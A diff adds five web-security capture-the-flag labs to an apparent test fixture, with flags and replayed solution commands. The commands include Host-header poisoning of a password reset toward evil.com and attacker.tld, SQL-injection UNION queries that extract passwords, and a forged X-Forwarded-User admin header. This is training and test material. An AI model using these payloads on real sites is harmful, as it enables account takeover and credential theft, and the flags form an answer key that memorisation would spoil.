@@ -48,6 +48,43 @@ const LABS = [
       `dig +short TXT _acme-challenge.internal.target.com > found.txt`,
     ],
   },
+  {
+    id: 'web-race-single-packet', flag: 'nto{s1ngl3_p4ck3t_4tt4ck_w1ns_th3_r4c3}', hints: 4,
+    solution: [
+      `curl -s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=7'`,
+      `cat turbo.py`,
+      `python3 turbo.py > found.txt`,
+    ],
+  },
+  {
+    id: 'web-waf-parsing-attacks', flag: 'nto{h0st_h34d3r_1nj3ct10n_c4ptur3s_th3_t0k3n}', hints: 4,
+    solution: [
+      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset`,
+      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset -H 'Host: evil.com'`,
+      `curl -s -d 'email=admin@shop.local' https://shop.local/password/reset -H 'Host: attacker.tld' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-waf-evasion-basics', flag: 'nto{v3rb_t4mp3r1ng_byp4ss3s_th3_w4f}', hints: 4,
+    solution: [
+      `curl -s 'https://shop.local/api/products?id=1%20UNION%20SELECT%20pass%20FROM%20users'`,
+      `curl -s -X PATCH 'https://shop.local/api/products?id=1%20UNION%20SELECT%201,password,3%20FROM%20users' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-websocket', flag: 'nto{w3bs0ck3t_trusts_x_f0rw4rd3d_us3r}', hints: 4,
+    solution: [
+      `websocat ws://t/ws`,
+      `websocat -H 'X-Forwarded-User: admin' ws://t/ws > found.txt`,
+    ],
+  },
+  {
+    id: 'web-tool-httpie', flag: 'nto{httpi3_m4k3s_4p1_r3c0n_3ff0rtl3ss}', hints: 4,
+    solution: [
+      `http GET https://api.example/v1/item?id=1`,
+      `http GET https://api.example/v1/flag 'X-API-Key:shp_live_9f3c2a' > found.txt`,
+    ],
+  },
 ]
 
 describe.each(LABS)('web lab B5: $id', ({ id, flag, hints, solution }) => {
